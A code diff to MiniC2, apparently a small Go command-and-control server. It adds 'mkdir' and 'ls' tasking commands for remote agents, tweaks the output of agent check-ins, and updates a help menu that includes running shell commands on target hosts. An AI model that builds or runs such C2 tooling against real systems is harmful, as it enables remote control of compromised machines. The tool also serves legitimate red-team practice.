@@ -83,7 +83,7 @@ func registerAgent(w http.ResponseWriter, r *http.Request) {
 
 func receiveOutput(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
-	fmt.Println("\n"+succ+" Host Called Home: ", r.FormValue("id"), "\n\n", r.FormValue("output")+"\n")
+	fmt.Println("\n"+succ+" Host Called Home:", r.FormValue("id"), "\n\n"+r.FormValue("output")+"\n")
 }
 
 func sendTasks(w http.ResponseWriter, r *http.Request) {
@@ -186,7 +186,7 @@ func agentExecutor(c string) {
 		return
 	} else if strings.Fields(c)[0] == "netinfo" {
 		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
-		tasklist[currentAgent] = append(tasklist[currentAgent], c)
+		tasklist[currentAgent] = append(tasklist[currentAgent], strings.Fields(c)[0])
 		return
 	} else if strings.Fields(c)[0] == "cd" {
 		if len(strings.Fields(c)) != 2 {
@@ -204,16 +204,29 @@ func agentExecutor(c string) {
 			return
 		}
 		tasklist[currentAgent] = append(tasklist[currentAgent], c)
+	} else if strings.Fields(c)[0] == "mkdir" {
+		if len(strings.Fields(c)) == 1 {
+			fmt.Println("Usage: mkdir <dir(s)>")
+			return
+		}
+		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
+		tasklist[currentAgent] = append(tasklist[currentAgent], c)
+	} else if strings.Fields(c)[0] == "ls" {
+		fmt.Println(notif + "Tasked beacon with: " + strings.Fields(c)[0])
+		tasklist[currentAgent] = append(tasklist[currentAgent], c)
 	} else if strings.Fields(c)[0] == "help" {
 		t := tabby.New()
 		t.AddHeader("Command", "Description")
 		t.AddLine("sleep <time>", "Adjusts checkin frequency for the agent (in seconds)")
 		t.AddLine("sysinfo", "Queries system information of agent")
-		t.AddLine("getuid", "Retrieves user information")
+		t.AddLine("getuid", "Retrieves user and group information")
 		t.AddLine("netinfo", "Retrieves network interfaces and IP addresses")
+		t.AddLine("===OS COMMANDS===")
 		t.AddLine("cd <dir>", "Changes Directory")
 		t.AddLine("pwd", "Prints Working Directory")
 		t.AddLine("chmod <mode> <file(s)>", "Changes permissions of specified files")
+		t.AddLine("mkdir <dir(s)>", "Creates specified Directories")
+		t.AddLine("ls <path>", "List the contents of the specified directory")
 		t.AddLine("exec <command>", "Executes specified shell command (Pipes and arrows work!)")
 		t.AddLine("exit/background/back", "Return to MiniC2 main menu")
 		t.Print()
@@ -233,18 +246,6 @@ func agentExecutor(c string) {
 func NoopCompleter(d prompt.Document) []prompt.Suggest {
 	return nil
 }
-
-/*
-func agentCompleter(d prompt.Document) []prompt.Suggest {
-
-	s := []prompt.Suggest{
-		{Text: "getuid", Description: "Gets User ID information"},
-		{Text: "sysinfo", Description: "Gets System Info"},
-		{Text: "exec", Description: "Runs a shell command on the target"},
-	}
-	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
-}
-*/
 
 func checkErr(err error) {
 	if err != nil {
